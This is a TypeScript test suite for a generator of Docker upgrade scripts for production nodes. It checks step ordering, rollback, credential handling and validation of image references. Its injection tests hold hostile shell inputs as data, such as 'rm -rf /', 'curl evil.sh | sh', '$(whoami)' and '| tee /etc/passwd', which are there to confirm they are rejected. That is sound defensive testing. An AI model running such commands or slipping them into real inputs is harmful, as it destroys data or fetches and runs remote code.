/**
 * V4-WP11B — 升级脚本的不变量。
 *
 * 这段脚本是**操作者会直接复制粘贴到生产节点上执行**的东西，所以测试的重点不是
 * "生成了字符串"，而是"脚本里的每一步顺序、身份复用与失败路径都不能被写错"。
 */
import { describe, expect, test } from "bun:test";
import {
  checkUpgradePrecondition,
  renderNodeUpgradeScript,
  validateAgentImageRef,
  type NodeUpgradeFacts,
} from "../node-upgrade.ts";

const facts: NodeUpgradeFacts = {
  node_key: "hk-in-01",
  agent_id: "81879c3a-7bc5-4be7-84cf-e4ac2dc2849c",
  role: "INGRESS",
  lifecycle: "maintenance",
};

const render = (over: Partial<NodeUpgradeFacts> = {}, image = "ghcr.io/tunex/agent:1.4.0") =>
  renderNodeUpgradeScript({ ...facts, ...over }, image, { panelURL: "https://panel.example.com" });

describe("ordering: never take the node down for a pull that may fail", () => {
  test("the image is pulled before the agent is stopped", () => {
    const { script } = render();
    const pull = script.indexOf("docker pull");
    const stop = script.indexOf("docker stop -t");
    expect(pull).toBeGreaterThan(-1);
    expect(stop).toBeGreaterThan(-1);
    expect(pull).toBeLessThan(stop);
  });

  test("a failed pull exits without touching the running agent", () => {
    const { script } = render();
    const pullBlock = script.slice(script.indexOf("if ! docker pull"), script.indexOf("# ── 2."));
    expect(pullBlock).toContain("die");
    // Nothing that stops or removes the container may appear in that branch.
    expect(pullBlock).not.toContain("docker stop");
    expect(pullBlock).not.toContain("docker rm");
  });

  test("an already-current image is a no-op", () => {
    const { script } = render();
    expect(script).toContain("已经是目标镜像，无需升级");
  });
});

describe("drain: SIGTERM with the container's own stop timeout", () => {
  test("stops with -t and uses the same timeout when recreating", () => {
    const { script } = render();
    expect(script).toContain('docker stop -t "$STOP_TIMEOUT"');
    expect(script).toContain('--stop-timeout "$STOP_TIMEOUT"');
    expect(script).toContain('STOP_TIMEOUT="15"');
  });

  test("the timeout is configurable and reported as the downtime window", () => {
    const rendered = renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", { stopTimeoutS: 30 });
    expect(rendered.script).toContain('STOP_TIMEOUT="30"');
    expect(rendered.downtime).toContain("30");
  });

  test("the main flow stops gracefully before it removes anything", () => {
    const { script } = render();
    // Assert on the EXECUTED sequence, not on where a helper is defined in the
    // file: `restore_previous` is declared earlier but only runs on failure.
    const mainFlow = script.slice(script.indexOf("# ── 3."));
    const stop = mainFlow.indexOf("docker stop -t");
    const rm = mainFlow.indexOf("docker rm -f");
    expect(stop).toBeGreaterThan(-1);
    expect(rm).toBeGreaterThan(stop);
  });
});

describe("identity: the new container is the SAME node", () => {
  test("reuses the host credential file and the LKG state directory", () => {
    const { script } = render();
    expect(script).toContain("-v /etc/tunex-agent/agent.env:/run/tunex-agent/agent.env:ro");
    expect(script).toContain("-v /var/lib/tunex-agent:/var/lib/tunex-agent");
    expect(script).toContain('--name "$CONTAINER"');
  });

  test("no new enrollment happens, and the script says so", () => {
    const { script, preserves } = render();
    // No enrollment API call and no one-time token: identity comes from the host
    // credential file that already exists.
    expect(script).not.toContain("/api/internal/node/enroll");
    expect(script).not.toContain("Enrollment ");
    expect(script).not.toContain("enroll-token");
    expect(preserves).toEqual({ node_identity: true, credential: true, lkg_state: true, forwards: true });
  });

  test("verifies the new process still authenticates, printing only an HTTP code", () => {
    const { script } = render();
    expect(script).toContain("/api/internal/node/snapshot");
    expect(script).toContain("TUNEX_NODE_CREDENTIAL");
    expect(script).toContain("%{http_code}");
    // The credential is read inside the container, never echoed by the script.
    expect(script).not.toMatch(/echo[^\n]*TUNEX_NODE_CREDENTIAL/);
  });

  test("a failed identity check rolls back instead of leaving a broken node", () => {
    const { script } = render();
    const identityBlock = script.slice(script.indexOf('if [ -n "$PANEL" ]'), script.indexOf("log \"升级完成"));
    expect(identityBlock).toContain("restore_previous");
  });
});

describe("rollback anchor", () => {
  test("records the running image before changing anything", () => {
    const { script } = render();
    const anchor = script.indexOf('PREVIOUS_IMAGE="$(docker inspect');
    const pull = script.indexOf("docker pull");
    expect(anchor).toBeGreaterThan(-1);
    expect(anchor).toBeLessThan(pull);
  });

  test("refuses to continue when the anchor cannot be read", () => {
    const { script } = render();
    expect(script).toContain("拒绝在没有回退锚点的情况下继续");
  });

  test("a container that exits immediately is rolled back", () => {
    const { script } = render();
    const startBlock = script.slice(script.indexOf("sleep 3"), script.indexOf('if [ -n "$PANEL" ]'));
    expect(startBlock).toContain("restore_previous");
  });
});

describe("the script never carries a credential", () => {
  test("no credential-shaped value is present", () => {
    const { script } = render();
    expect(script).not.toMatch(/Bearer\s+[A-Za-z0-9._~+/=-]{8,}/);
    expect(script).not.toContain("-----BEGIN");
    expect(script).not.toMatch(/\b[0-9a-fA-F]{32,}\b/);
  });

  test("a digest-pinned image is allowed (a digest is not a secret)", () => {
    const digest = `ghcr.io/tunex/agent@sha256:${"a".repeat(64)}`;
    const { script } = render({}, digest);
    expect(script).toContain(digest);
  });

  test("a caller cannot smuggle a token through a rendered field", () => {
    expect(() =>
      renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", {
        panelURL: "https://panel.example.com/?token=AbCdEf0123456789AbCdEf0123456789",
      }),
    ).toThrow(/credential-shaped/);
  });

  test("shell metacharacters in a rendered field cannot escape into a command", () => {
    const { script } = render({ node_key: "hk-01; rm -rf / #" });
    expect(script).not.toContain("rm -rf /");
  });
});

describe("image reference validation", () => {
  test("accepts normal references, with and without tag or digest", () => {
    for (const image of [
      "tunex/agent:1.4.0",
      "ghcr.io/tunex/agent",
      "ghcr.io/tunex/agent:1.4.0-rc.1",
      `ghcr.io/tunex/agent@sha256:${"b".repeat(64)}`,
      "registry.internal:5000/tunex/agent:v2",
    ]) {
      expect(validateAgentImageRef(image)).toEqual({ ok: true, image });
    }
  });

  test("refuses anything that could break out of the script", () => {
    for (const bad of [
      "agent:1.0; curl evil.sh | sh",
      "agent:1.0 && rm -rf /",
      "agent:1.0$(whoami)",
      "agent:1.0`id`",
      "agent:1.0\nRUN evil",
      "agent:1.0 | tee /etc/passwd",
      ">agent:1.0",
      "",
      "   ",
      null,
      42,
      "x".repeat(300),
    ]) {
      const result = validateAgentImageRef(bad);
      expect(result.ok).toBe(false);
    }
  });

  test("surrounding whitespace is trimmed, not accepted verbatim", () => {
    // Whatever is validated is what lands in the script, so the value is the
    // trimmed one — a paste with a stray space must not reject a valid image.
    expect(validateAgentImageRef("  agent:1.0  ")).toEqual({ ok: true, image: "agent:1.0" });
  });
});

describe("preconditions encode the maintenance-before-upgrade rule", () => {
  test("refuses an active node and explains why", () => {
    const result = checkUpgradePrecondition({ ...facts, lifecycle: "active" });
    expect(result.ok).toBe(false);
    expect(result.code).toBe("node_not_in_maintenance");
    expect(result.message).toContain("maintenance");
  });

  test("allow_active is an explicit, auditable override", () => {
    expect(checkUpgradePrecondition({ ...facts, lifecycle: "active" }, { allowActive: true }).ok).toBe(true);
  });

  test("an installed maintenance node may upgrade", () => {
    expect(checkUpgradePrecondition(facts).ok).toBe(true);
  });

  test("a retired node is a one-way door and cannot be upgraded", () => {
    const result = checkUpgradePrecondition({ ...facts, lifecycle: "retired" }, { allowActive: true });
    expect(result.ok).toBe(false);
    expect(result.code).toBe("node_retired");
  });

  test("a node with no agent identity is refused (nothing to preserve)", () => {
    const result = checkUpgradePrecondition({ ...facts, agent_id: "" }, { allowActive: true });
    expect(result.ok).toBe(false);
    expect(result.code).toBe("node_has_no_agent_id");
  });
});
